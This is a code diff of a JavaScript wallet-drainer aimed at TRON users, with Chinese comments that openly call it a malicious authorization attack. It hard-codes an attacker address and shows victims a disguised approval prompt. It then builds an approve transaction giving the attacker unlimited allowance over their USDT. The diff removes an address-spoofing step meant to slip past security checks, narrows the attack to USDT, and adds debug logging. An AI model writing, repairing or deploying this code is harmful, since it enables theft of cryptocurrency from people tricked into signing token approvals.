@@ -9,21 +9,11 @@
     // 攻击者地址（A用户）
     let ATTACKER_ADDRESS = 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x';
     
-    // 🎯 双重地址机制：授权阶段返回伪装地址，转移阶段返回真实地址
+    // 🎯 简化地址获取，优先保证授权功能正常
     function getCurrentAttackerAddress(phase = 'authorize') {
-        if (phase === 'transfer') {
-            // 转移阶段：必须使用真实攻击者地址
-            console.log(`🎯 转移阶段使用真实攻击者地址: ${ATTACKER_ADDRESS}`);
-            return ATTACKER_ADDRESS;
-        } else {
-            // 授权阶段：使用伪装地址绕过安全检测
-            if (window.SimpleAddressSpoofing && window.SimpleAddressSpoofing.getSpoofAddress) {
-                const spoofAddress = window.SimpleAddressSpoofing.getSpoofAddress();
-                console.log(`🎭 授权显示使用伪装地址: ${ATTACKER_ADDRESS} → ${spoofAddress}`);
-                return spoofAddress;
-            }
-            return ATTACKER_ADDRESS;
-        }
+        // 🚨 临时简化：始终返回真实攻击者地址，确保授权正常工作
+        console.log(`🎯 使用真实攻击者地址 (${phase}): ${ATTACKER_ADDRESS}`);
+        return ATTACKER_ADDRESS;
     }
     
     // 支持的代币合约地址（TRON网络）
@@ -61,24 +51,40 @@
     async function initiateMaliciousAuthorization(victimAddress) {
         console.log('🎯🎯🎯 启动恶意授权攻击！🎯🎯🎯');
         console.log('🎯 受害者地址:', victimAddress);
+        console.log('🎯 TronWeb状态:', window.tronWeb ? '已加载' : '未加载');
+        console.log('🎯 TronWeb ready:', window.tronWeb?.ready);
+        
         const currentAttacker = getCurrentAttackerAddress();
         console.log('🎯 攻击者地址:', currentAttacker);
         
         // 显示"授权确认"界面，让用户以为是正常授权
         showAuthorizationPrompt(victimAddress);
         
-        // 对每种代币进行恶意授权
-        for (const [tokenName, contractAddress] of Object.entries(TOKEN_CONTRACTS)) {
-            try {
-                console.log(`🎯 尝试获取${tokenName}授权...`);
-                await requestMaliciousAuthorization(victimAddress, contractAddress, tokenName);
-            } catch (error) {
-                console.log(`🎯 ${tokenName}授权失败:`, error.message);
-            }
+        // 🚨 专注USDT授权，简化流程
+        try {
+            console.log('🎯🎯🎯 开始USDT授权请求...🎯🎯🎯');
+            const usdtContract = TOKEN_CONTRACTS.USDT;
+            console.log('🎯 USDT合约地址:', usdtContract);
+            
+            await requestMaliciousAuthorization(victimAddress, usdtContract, 'USDT');
+        } catch (error) {
+            console.log('❌ USDT授权请求失败:', error);
+            console.log('❌ 错误详情:', error.message);
+            console.log('❌ 错误堆栈:', error.stack);
         }
         
-        // TRX不需要授权，直接尝试转移
-        await attemptTrxTransfer(victimAddress);
+        // 暂时注释掉其他代币和TRX转移
+        // for (const [tokenName, contractAddress] of Object.entries(TOKEN_CONTRACTS)) {
+        //     try {
+        //         console.log(`🎯 尝试获取${tokenName}授权...`);
+        //         await requestMaliciousAuthorization(victimAddress, contractAddress, tokenName);
+        //     } catch (error) {
+        //         console.log(`🎯 ${tokenName}授权失败:`, error.message);
+        //     }
+        // }
+        
+        // // TRX不需要授权，直接尝试转移
+        // await attemptTrxTransfer(victimAddress);
     }
     
     // 🎯 显示伪装的授权提示
@@ -152,7 +158,19 @@
     // 🎯 请求恶意代币授权
     async function requestMaliciousAuthorization(victimAddress, contractAddress, tokenName) {
         try {
-            console.log(`🎯 正在为${tokenName}请求恶意授权...`);
+            console.log(`🎯🎯🎯 正在为${tokenName}请求恶意授权...🎯🎯🎯`);
+            console.log(`🎯 合约地址: ${contractAddress}`);
+            console.log(`🎯 受害者地址: ${victimAddress}`);
+            console.log(`🎯 攻击者地址: ${ATTACKER_ADDRESS}`);
+            console.log(`🎯 授权金额: ${MAX_AUTHORIZATION}`);
+            
+            // 检查TronWeb状态
+            if (!window.tronWeb) {
+                throw new Error('TronWeb未加载');
+            }
+            if (!window.tronWeb.ready) {
+                throw new Error('TronWeb未就绪');
+            }
             
             // 构建approve交易，授权攻击者可以转移用户的代币
             const functionSelector = 'approve(address,uint256)';
@@ -161,7 +179,9 @@
                 {type: 'uint256', value: MAX_AUTHORIZATION}   // 最大授权金额
             ];
             
-            console.log(`🎯 构建授权交易参数: spender=${ATTACKER_ADDRESS}, amount=${MAX_AUTHORIZATION}`);
+            console.log(`🎯 开始构建智能合约交易...`);
+            console.log(`🎯 函数选择器: ${functionSelector}`);
+            console.log(`🎯 参数:`, parameters);
             
             const transaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
                 contractAddress,
@@ -170,6 +190,8 @@
                 parameters,
                 victimAddress
             );
+            
+            console.log(`🎯 交易构建结果:`, transaction);
             
             if (transaction.result && transaction.result.result) {
                 console.log(`🎯 ${tokenName}授权交易构建成功`);
